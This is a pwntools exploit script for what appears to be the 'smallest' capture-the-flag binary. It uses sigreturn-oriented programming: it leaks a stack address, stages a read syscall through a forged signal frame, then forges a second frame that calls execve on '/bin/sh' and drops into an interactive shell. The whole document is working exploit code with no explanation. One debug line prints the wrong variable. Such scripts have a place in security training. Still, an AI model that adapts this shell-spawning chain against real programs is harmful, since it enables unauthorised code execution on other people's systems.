from pwn import *

context(arch="amd64", os="linux", log_level="debug")
io = process("./smallest")

syscall_ret = 0x4000BE
start_addr = 0x4000B0

payload = p64(start_addr) * 3
io.send(payload)
sleep(0.1)

io.send(b"\xb3")
leaked = io.recvn(0x400)
stack_addr = u64(leaked[8:16])

print("leak stack address :", hex(start_addr))

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read  # pyright: ignore[reportAttributeAccessIssue]
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

payload = p64(start_addr) + p64(syscall_ret) + bytes(sigframe)
io.send(payload)

io.send(p64(syscall_ret) + b"\x00" * 7)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve  # pyright: ignore[reportAttributeAccessIssue]
sigframe.rdi = stack_addr + 0x120
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = syscall_ret


frame_payload = p64(start_addr) + p64(syscall_ret) + bytes(sigframe)
print(len(frame_payload))
payload = frame_payload.ljust(0x120, b"\x00") + b"/bin/sh\x00"
io.send(payload)

io.send(p64(syscall_ret) + b"\x00" * 7)
io.interactive()
